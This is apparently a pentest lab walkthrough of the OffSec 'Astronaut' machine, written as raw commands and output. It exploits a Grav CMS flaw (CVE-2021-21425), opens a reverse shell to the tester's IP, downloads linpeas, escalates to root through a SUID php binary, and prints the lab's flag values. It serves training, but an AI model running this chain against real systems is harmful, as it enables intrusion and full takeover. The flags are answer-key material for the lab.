No credentials were provided for this machine

nmap -vvv -T5 -Pn 192.168.164.12 -p- -A -oN nmap.txt

sudo echo "192.168.164.12 astronaut.offsec" | sudo tee -a /etc/hosts

http://astronaut.offsec/

http://astronaut.offsec/grav-admin/

https://nvd.nist.gov/vuln/detail/CVE-2021-21425

https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/

http://astronaut.offsec/grav-admin/admin

https://github.com/bluetoothStrawberry/cve-2021-21425

python3 cve-2021-21425.py --url http://astronaut.offsec/grav-admin

Waiting 1 seconds for http://astronaut.offsec/grav-admin/tmp/758c582ba87de6a9.php creation!
Initiating hacking session
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 

OR

https://github.com/CsEnox/CVE-2021-21425

┌──(lepotekil㉿kali)-[~/proving-ground-prac/astronaut]
└─$ python3 cve-2021-21425.py -c 'sh -i >& /dev/tcp/192.168.45.170/22 0>&1' -t http://astronaut.offsec/grav-admin      
/home/lepotekil/proving-ground-prac/astronaut/cve-2021-21425.py:25: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  a = str(soup.findAll('input')[3])
[*] Creating File
Scheduled task created for file creation, wait one minute
[*] Running file
Scheduled task created for command, wait one minute
Exploit completed

┌──(lepotekil㉿kali)-[~/proving-ground-prac/astronaut]
└─$ nc -lvnp 22  
listening on [any] 22 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.164.12] 42422
sh: 0: can't access tty; job control turned off
$ 

whic python2
wich python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm && stty rows 38 columns 116

www-data@gravity:~/html/grav-admin$ ls
ls
assets  cache               composer.json    images       logs       robots.txt   tmp     webserver-configs
backup  CHANGELOG.md        composer.lock    index.php    now.json   SECURITY.md  user
bin     CODE_OF_CONDUCT.md  CONTRIBUTING.md  LICENSE.txt  README.md  system       vendor
www-data@gravity:~/html/grav-admin$ 

www-data@gravity:/tmp$ which wget
which wget
/usr/bin/wget
www-data@gravity:/tmp$ wget http://192.168.45.170:8000/linpeas.sh
wget http://192.168.45.170:8000/linpeas.sh
--2025-10-20 13:37:13--  http://192.168.45.170:8000/linpeas.sh
Connecting to 192.168.45.170:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971820 (949K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                   100%[==============================================>] 949.04K  4.21MB/s    in 0.2s    

2025-10-20 13:37:14 (4.21 MB/s) - ‘linpeas.sh’ saved [971820/971820]

www-data@gravity:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh

https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid

www-data@gravity:/tmp$ ./linpeas.sh -o interesting_perms_files
./linpeas.sh -o interesting_perms_files

-rwsr-xr-x 1 root root 4.6M Feb 23  2023 /usr/bin/php7.4 (Unknown SUID binary!)

www-data@gravity:/tmp$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
whoami
root
# ls /root
ls /root
flag1.txt  proof.txt  snap
# cat /root/proof.txt
cat /root/proof.txt
de0867d41e78c906236250b29e7e768c
# cat /root/flag1.txt
cat /root/flag1.txt
T2Zmc2Vj
#
